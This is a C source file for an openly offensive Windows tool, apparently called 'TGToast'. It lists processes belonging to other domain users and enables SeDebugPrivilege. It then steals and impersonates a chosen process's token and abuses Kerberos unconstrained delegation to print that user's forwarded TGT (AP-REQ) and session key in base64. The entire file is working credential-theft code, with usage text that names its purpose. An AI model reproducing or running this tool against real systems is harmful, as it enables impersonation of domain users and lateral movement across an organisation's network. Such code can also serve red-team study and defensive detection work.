#define SECURITY_WIN32

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <dsgetdc.h>
#include <lm.h>
#include <security.h>
#include <sspi.h>
#include <wincrypt.h>
#include <ntsecapi.h>

#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {
    TOKEN_PRIVILEGES TokenPrivs = { 0 };
    LUID Luid = { 0 };

    if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
        wprintf(L"[!] LookupPrivilegeValueW failed with error: %lu \n", GetLastError()); fflush(stdout);
        return FALSE;
    }

    TokenPrivs.PrivilegeCount = 1;
    TokenPrivs.Privileges[0].Luid = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        wprintf(L"[!] AdjustTokenPrivileges failed with error: %lu \n", GetLastError()); fflush(stdout);
        return FALSE;
    }

    return TRUE;
}

HANDLE GetCurrentToken() {
    HANDLE hToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken)) {
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
                return NULL;
            }
        }
        else {
            return NULL;
        }
    }
    return hToken;
}

BOOL GetTokenUserW(_In_ HANDLE hToken, _Out_ LPWSTR* szUsername) {
    BOOL                        bResult = FALSE;
    PTOKEN_USER                 pTokenUser = NULL;
    DWORD                       dwLength = 0;
    LPWSTR                      lpName = NULL, lpDomain = NULL;
    DWORD                       cchName = 0, cchDomain = 0;
    SID_NAME_USE                sidUse;

    if (!hToken || !szUsername) return FALSE;
    *szUsername = NULL;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;

    pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
    if (pTokenUser == NULL) return FALSE;

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) goto _END_OF_FUNC;

    LookupAccountSidW(NULL, pTokenUser->User.Sid, NULL, &cchName, NULL, &cchDomain, &sidUse);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) goto _END_OF_FUNC;

    lpName = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchName * sizeof(WCHAR));
    lpDomain = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchDomain * sizeof(WCHAR));
    if (lpName == NULL || lpDomain == NULL) goto _END_OF_FUNC;

    if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, lpName, &cchName, lpDomain, &cchDomain, &sidUse)) goto _END_OF_FUNC;

    DWORD totalSize = cchDomain + 1 + cchName + 1;
    *szUsername = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSize * sizeof(WCHAR));
    if (*szUsername == NULL) goto _END_OF_FUNC;

    swprintf_s(*szUsername, totalSize, L"%s\\%s", lpDomain, lpName);
    bResult = TRUE;

_END_OF_FUNC:
    if (pTokenUser) HeapFree(GetProcessHeap(), 0, pTokenUser);
    if (lpName) HeapFree(GetProcessHeap(), 0, lpName);
    if (lpDomain) HeapFree(GetProcessHeap(), 0, lpDomain);
    if (!bResult && szUsername && *szUsername) {
        HeapFree(GetProcessHeap(), 0, *szUsername);
        *szUsername = NULL;
    }
    return bResult;
}


int forgeTGT(wchar_t* spn)
{
    int resultStatus = 1;
    CredHandle hCredential;
    TimeStamp tsExpiry;
    SECURITY_STATUS getHandle = AcquireCredentialsHandleW(NULL, (SEC_WCHAR*)MICROSOFT_KERBEROS_NAME_W, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredential, &tsExpiry);

    if (getHandle != SEC_E_OK) {
        wprintf(L"Error acquiring credentials handle: 0x%lx\n", getHandle);
        fflush(stdout);
        return resultStatus;
    }

    wprintf(L"[+] Successfully obtained a handle to the current credentials set!\n");
    fflush(stdout);

    CtxtHandle newContext;
    SecBuffer secbufPointer = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc output = { SECBUFFER_VERSION, 1, &secbufPointer };
    ULONG contextAttr;
    SECURITY_STATUS initSecurity = InitializeSecurityContextW(&hCredential, NULL, (SEC_WCHAR*)spn, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &newContext, &output, &contextAttr, NULL);

    if (initSecurity == SEC_E_OK || initSecurity == SEC_I_CONTINUE_NEEDED)
    {
        wprintf(L"[+] Successfully initialized the Kerberos GSS-API!\n");
        fflush(stdout);

        if (contextAttr & ISC_REQ_DELEGATE)
        {
            wprintf(L"[+] The delegation request was successful! AP-REQ ticket is now in the GSS-API output.\n");
            fflush(stdout);

            DWORD destSize = 0;
            CryptBinaryToStringA((CONST BYTE*)secbufPointer.pvBuffer, (DWORD)secbufPointer.cbBuffer, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destSize);

            char* base64String = (char*)malloc((SIZE_T)destSize);
            if (base64String != NULL && CryptBinaryToStringA((CONST BYTE*)secbufPointer.pvBuffer, (DWORD)secbufPointer.cbBuffer, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64String, &destSize))
            {
                NTSTATUS statusSuccess = (NTSTATUS)0x00000000;
                HANDLE lsaHandle;
                if (LsaConnectUntrusted(&lsaHandle) == statusSuccess) {
                    LSA_STRING kerbPackage;
                    kerbPackage.Buffer = MICROSOFT_KERBEROS_NAME_A;
                    kerbPackage.Length = (USHORT)strlen(kerbPackage.Buffer);
                    kerbPackage.MaximumLength = kerbPackage.Length + 1;
                    ULONG authpackageId;

                    if (LsaLookupAuthenticationPackage(lsaHandle, &kerbPackage, &authpackageId) == statusSuccess) {
                        USHORT newspnSize = (USHORT)((wcslen((LPCWSTR)spn) + 1) * sizeof(wchar_t));
                        ULONG bufferLength = sizeof(KERB_RETRIEVE_TKT_REQUEST) + newspnSize;
                        PKERB_RETRIEVE_TKT_REQUEST retrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, bufferLength);

                        if (retrieveRequest != NULL) {
                            retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
                            retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
                            retrieveRequest->TargetName.Length = newspnSize - sizeof(wchar_t);
                            retrieveRequest->TargetName.MaximumLength = newspnSize;
                            retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
                            RtlMoveMemory(retrieveRequest->TargetName.Buffer, spn, retrieveRequest->TargetName.MaximumLength);

                            int encryptionTypes[] = { 18, 17, 23 }; // AES256, AES128, RC4
                            const char* encryptionNames[] = { "AES256", "AES128", "RC4" };
                            BOOL success = FALSE;
                            PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;

                            for (int i = 0; i < 3; ++i) {
                                retrieveRequest->EncryptionType = encryptionTypes[i];
                                if (retrieveResponse) LsaFreeReturnBuffer(retrieveResponse);
                                retrieveResponse = NULL;
                                NTSTATUS packageStatus = 0;
                                ULONG returnLength = 0;

                                NTSTATUS callauthPkg = LsaCallAuthenticationPackage(lsaHandle, authpackageId, (PVOID)retrieveRequest, bufferLength, (PVOID*)&retrieveResponse, &returnLength, &packageStatus);

                                if (callauthPkg == statusSuccess && packageStatus == statusSuccess) {
                                    wprintf(L"[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!\n");
                                    fflush(stdout);

                                    PVOID sessionkeynob64 = malloc(retrieveResponse->Ticket.SessionKey.Length);
                                    if (sessionkeynob64) {
                                        RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);
                                        DWORD sessionKeyB64Size = 0;
                                        CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sessionKeyB64Size);
                                        LPSTR sessionKey = (LPSTR)malloc(sessionKeyB64Size);
                                        if (sessionKey && CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, sessionKey, &sessionKeyB64Size)) {

                                            printf("\n[+] AP-REQ output:\n");
                                            fflush(stdout);

                                            const size_t chunkSize = 64;
                                            const char* currentPos = base64String;
                                            size_t totalLen = strlen(base64String);
                                            while (currentPos < base64String + totalLen) {
                                                size_t remaining = totalLen - (currentPos - base64String);
                                                size_t lenToPrint = (remaining < chunkSize) ? remaining : chunkSize;
                                                fwrite(currentPos, sizeof(char), lenToPrint, stdout);
                                                fflush(stdout);
                                                currentPos += lenToPrint;
                                            }

                                            printf("\n\n[+] Kerberos session key: \n%s\n\n[+] Encryption:\n%s\n", sessionKey, encryptionNames[i]);
                                            fflush(stdout);

                                            success = TRUE;
                                            free(sessionKey);
                                        }
                                        free(sessionkeynob64);
                                    }
                                    break;
                                }
                            }
                            if (retrieveResponse) LsaFreeReturnBuffer(retrieveResponse);
                            LocalFree(retrieveRequest);

                            if (success) {
                                resultStatus = 0;
                            }
                            else {
                                wprintf(L"\nError! Failed to retrieve Kerberos session key.\n");
                                fflush(stdout);
                            }
                        }
                    }
                    LsaDeregisterLogonProcess(lsaHandle);
                }
            }
            if (base64String) free(base64String);
        }
        else {
            wprintf(L"Error! Client is not allowed to delegate to the target SPN.\n");
            fflush(stdout);
        }
        FreeContextBuffer(secbufPointer.pvBuffer);
    }
    else {
        wprintf(L"Error! Error initializing the Kerberos GSS-API: 0x%lx\n", initSecurity);
        fflush(stdout);
    }
    FreeCredentialsHandle(&hCredential);
    return resultStatus;
}

BOOL ListProcesses() {
    HANDLE hSnap = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W pe32;
    LPWSTR szCurrentUser = NULL;
    HANDLE hCurrentToken = NULL;
    LPWSTR szDomainName = NULL;
    NETSETUP_JOIN_STATUS joinStatus;

    if (NetGetJoinInformation(NULL, &szDomainName, &joinStatus) != NERR_Success) {
        wprintf(L"[-] Could not get domain join information. Error: %lu\n", GetLastError());
        fflush(stdout);
        return FALSE;
    }

    if (joinStatus != NetSetupDomainName) {
        wprintf(L"[-] This machine is not joined to a domain!\n");
        fflush(stdout);
        NetApiBufferFree(szDomainName);
        return FALSE;
    }

    //wprintf(L"[*] Machine is joined to domain: %s\n", szDomainName);

    hCurrentToken = GetCurrentToken();
    if (!hCurrentToken || !GetTokenUserW(hCurrentToken, &szCurrentUser)) {
        wprintf(L"[-] Could not get current user.\n"); fflush(stdout);
        if (hCurrentToken) CloseHandle(hCurrentToken);
        NetApiBufferFree(szDomainName);
        return FALSE;
    }
    CloseHandle(hCurrentToken);

    wprintf(L"[*] Current User: %s\n", szCurrentUser); fflush(stdout);
    wprintf(L"[*] Searching for processes belonging to other DOMAIN users...\n\n"); fflush(stdout);
    wprintf(L"%-6s | %-40s | %s\n", L"PID", L"User", L"Process Name"); fflush(stdout);
    wprintf(L"----------------------------------------------------------------------------\n"); fflush(stdout);

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, szCurrentUser);
        NetApiBufferFree(szDomainName);
        return FALSE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &pe32)) {
        CloseHandle(hSnap);
        HeapFree(GetProcessHeap(), 0, szCurrentUser);
        NetApiBufferFree(szDomainName);
        return FALSE;
    }

    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess) {
            HANDLE hToken = NULL;
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                LPWSTR szProcessUser = NULL;
                if (GetTokenUserW(hToken, &szProcessUser) && szProcessUser) {
                    if (_wcsicmp(szCurrentUser, szProcessUser) != 0) {
                        wchar_t* separator = wcschr(szProcessUser, L'\\');
                        if (separator) {
                            size_t domainPartLength = separator - szProcessUser;
                            if (_wcsnicmp(szProcessUser, szDomainName, domainPartLength) == 0 && wcslen(szDomainName) == domainPartLength) {
                                wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile);
                                fflush(stdout);
                            }
                        }
                    }
                    HeapFree(GetProcessHeap(), 0, szProcessUser);
                }
                CloseHandle(hToken);
            }
            CloseHandle(hProcess);
        }
    } while (Process32NextW(hSnap, &pe32));

    CloseHandle(hSnap);
    HeapFree(GetProcessHeap(), 0, szCurrentUser);
    NetApiBufferFree(szDomainName);
    return TRUE;
}


void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg) {
    HANDLE hToken = NULL;
    HANDLE hCurrentToken = GetCurrentToken();
    if (hCurrentToken) {
        if (SetPrivilege(hCurrentToken, L"SeDebugPrivilege")) {
            wprintf(L"[+] SeDebugPrivilege enabled.\n"); fflush(stdout);
        }
        CloseHandle(hCurrentToken);
    }

    wprintf(L"[*] Attempting to steal token from PID %lu...\n", pid); fflush(stdout);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        wprintf(L"[-] OpenProcess failed with error: %lu\n", GetLastError()); fflush(stdout);
        return;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        wprintf(L"[-] OpenProcessToken failed with error: %lu\n", GetLastError()); fflush(stdout);
        CloseHandle(hProcess);
        return;
    }
    CloseHandle(hProcess);

    LPWSTR szTokenUser = NULL;
    GetTokenUserW(hToken, &szTokenUser);
    wprintf(L"[+] Successfully stole token from user: %s\n", szTokenUser ? szTokenUser : L"UNKNOWN"); fflush(stdout);
    if (szTokenUser) HeapFree(GetProcessHeap(), 0, szTokenUser);

    if (!ImpersonateLoggedOnUser(hToken)) {
        wprintf(L"[-] ImpersonateLoggedOnUser failed with error: %lu. Aborting.\n", GetLastError()); fflush(stdout);
        CloseHandle(hToken);
        return;
    }

    wprintf(L"[*] Successfully impersonating user. Now attempting TGT delegation abuse...\n"); fflush(stdout);
    wprintf(L"----------------------------------------------------------------------------\n"); fflush(stdout);

    wprintf(L"[+] Target Domain (for reference): %s\n", domainnameArg); fflush(stdout);
    wprintf(L"[+] Target SPN: %s\n", spnArg); fflush(stdout);

    if (forgeTGT(spnArg) == 0) {
        wprintf(L"\n[+] tgtdelegation succeeded under impersonated context!\n"); fflush(stdout);
    }
    else {
        wprintf(L"\n[-] tgtdelegation failed under impersonated context.\n"); fflush(stdout);
    }

    wprintf(L"----------------------------------------------------------------------------\n"); fflush(stdout);
    wprintf(L"[*] TGT delegation attempt finished. Reverting to original identity.\n"); fflush(stdout);
    RevertToSelf();
    CloseHandle(hToken);
}

void printToaster() {
    wprintf(L"\n");
    wprintf(L"      _   __           __________________                 __ \n");
    wprintf(L"     ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_ \n");
    wprintf(L"     |     ||          / / / / __  / / / __ \\/ __ `/ ___/ __/\n");
    wprintf(L"     |     ||         / / / /_/ / / / / /_/ / /_/ (__  ) /_  \n");
    wprintf(L"     '-----'`        /_/  \\____/ /_/  \\____/\\__,_/____/\\__/  \n");
    wprintf(L"\n");
    fflush(stdout);
}

void PrintUsage(const wchar_t* progName) {
    wprintf(L"\nTool to perform TGT delegation abuse, with token stealing capabilities.\n\n");
    wprintf(L"Usage: %s <option> [arguments]\n\n", progName);
    wprintf(L"Options:\n");
    wprintf(L"  /list\t\t\t\tLists processes from other domain users.\n");
    wprintf(L"  /steal <PID> <domain> <spn>\tSteals token, impersonates, and runs tgtdelegation.\n\n");
    wprintf(L"  Example: %s /steal 6969 corp.local CIFS/dc01.corp.local\n", progName);
    fflush(stdout);
}


int wmain(int argc, wchar_t* argv[]) {
    printToaster();
    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"/list") == 0) {
        if (argc != 2) { PrintUsage(argv[0]); return 1; }
        ListProcesses();
    }
    else if (_wcsicmp(argv[1], L"/steal") == 0) {
        if (argc < 5) {
            wprintf(L"[!] Error: The /steal option requires a PID, a domain, and an SPN.\n\n"); fflush(stdout);
            PrintUsage(argv[0]);
            return 1;
        }

        ULONG pid = _wtoi(argv[2]);
        if (pid == 0) {
            wprintf(L"[!] Error: Invalid PID.\n\n"); fflush(stdout);
            return 1;
        }
        StealAndDelegate(pid, argv[3], argv[4]);
    }
    else {
        wprintf(L"[!] Error: Unknown option \"%s\".\n\n", argv[1]); fflush(stdout);
        PrintUsage(argv[0]);
        return 1;
    }

    return 0;
}